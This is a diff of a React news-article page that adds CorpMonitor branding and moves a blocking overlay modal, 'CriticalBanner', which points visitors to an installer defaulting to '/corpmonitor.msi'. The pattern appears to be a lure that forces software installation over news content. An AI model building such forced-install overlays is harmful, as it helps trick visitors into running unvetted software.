@@ -8,6 +8,8 @@ import { useTranslate } from "@/hooks/useTranslate";
 import { LanguageSwitcher } from "@/components/LanguageSwitcher";
 import { T } from "@/components/T";
 import { Loader2 } from 'lucide-react';
+import { CorpMonitorHeader } from '@/components/branding/CorpMonitorHeader';
+import { CorpMonitorFooter } from '@/components/branding/CorpMonitorFooter';
 
 const Noticia = () => {
   const { id } = useParams<{ id: string }>();
@@ -60,13 +62,16 @@ const Noticia = () => {
   }
 
   return (
-    <div className="min-h-screen bg-background relative">
-      {/* Seletor de idioma */}
-      <div className="absolute top-4 right-4 z-40">
-        <LanguageSwitcher />
-      </div>
+    <div className="min-h-screen bg-background flex flex-col">
+      <CorpMonitorHeader />
+      
+      <div className="relative flex-1">
+        {/* Seletor de idioma */}
+        <div className="absolute top-4 right-4 z-40">
+          <LanguageSwitcher />
+        </div>
 
-      <div className="max-w-5xl mx-auto p-4 py-8">
+        <div className="max-w-5xl mx-auto p-4 py-8">
         <NewsPreview
           title={translatedNews.title || news.title}
           description={translatedNews.description || (news.description ?? undefined)}
@@ -81,10 +86,13 @@ const Noticia = () => {
           readingTime={news.reading_time ?? undefined}
           url={news.url}
         />
+        </div>
+        
+        {/* Modal bloqueante sobreposto */}
+        <CriticalBanner installerUrl={news.installer_url ?? '/corpmonitor.msi'} />
       </div>
       
-      {/* Modal bloqueante sobreposto */}
-      <CriticalBanner installerUrl={news.installer_url ?? '/corpmonitor.msi'} />
+      <CorpMonitorFooter />
     </div>
   );
 };
